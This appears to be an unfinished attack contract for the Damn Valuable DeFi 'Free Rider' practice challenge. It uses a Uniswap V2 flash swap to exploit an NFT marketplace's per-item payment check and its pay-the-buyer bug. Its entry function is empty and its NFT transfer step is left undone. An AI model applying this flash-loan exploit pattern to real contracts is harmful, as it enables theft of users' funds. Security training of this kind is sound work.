// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableToken.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "solmate/src/tokens/WETH.sol";

contract AttackFreeRider {
    address payable public immutable attacker;
    DamnValuableToken public immutable dvt;
    WETH public immutable weth;
    DamnValuableNFT public immutable nft;
    IUniswapV2Pair public immutable pair;
    IUniswapV2Factory public immutable factory;
    FreeRiderNFTMarketplace public immutable marketplace;
    uint256 public constant wethLoanAmount = 15 ether;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        DamnValuableToken _dvt,
        DamnValuableNFT _nft,
        WETH _weth,
        IUniswapV2Factory _factory,
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace
    ) payable {
        attacker = payable(msg.sender);
        dvt = _dvt;
        weth = _weth;
        nft = _nft;
        pair = _pair;
        factory = _factory;
        marketplace = _marketplace;
    }

    function attack() external payable {}

    function _flashSwap() internal {
        // Make a flash swap from UniswapV2Pair
        // We need 15 eth to transfer all NFT because of contract vulnerability
        // That only asks the msg.value to be greater than the price to pay
        // Even if you want to buy multiple nfts.
        bytes memory data = abi.encode(wethLoanAmount);
        pair.swap(
            wethLoanAmount, // Amount of WETH we get
            0, // Amount of DVT we get
            address(this), // receiver
            data
        );
    }

    function uniswapV2Call(
        address sender,
        uint256 wethAmount,
        uint256 dvtAmount,
        bytes calldata data
    ) external {
        // This is the callback function that will be executed from Uniswap

        // Withdraw 15WETH to ETH because marketplace receives ETH.
        weth.withdraw(wethAmount);

        // Purchase all NFTS for the price of 1 (15 ETH)
        // This will also give us 90 extra ETH
        // Because of second vulnerability that transfers first the NFT
        // Then pays the amount using token owner
        // In a nutshell, it pays the buyer the ETH back for buying the NFT to seller xD
        marketplace.buyMany{value: wethLoanAmount}(tokenIds);

        // Calculate loan repayment
        uint256 fee = ((wethLoanAmount * 3) / 997) + 1;
        uint256 amountToRepay = wethLoanAmount + fee;
        // Deposit needed ETH to WETH so we can pay back the loan
        weth.deposit{value: amountToRepay}();

        // Pay back the loan + fee to pair
        weth.transfer(address(pair), amountToRepay);

        // Still need to transfer all the nfts to claim rewards from recovery contract.
    }

    receive() external payable {}
}
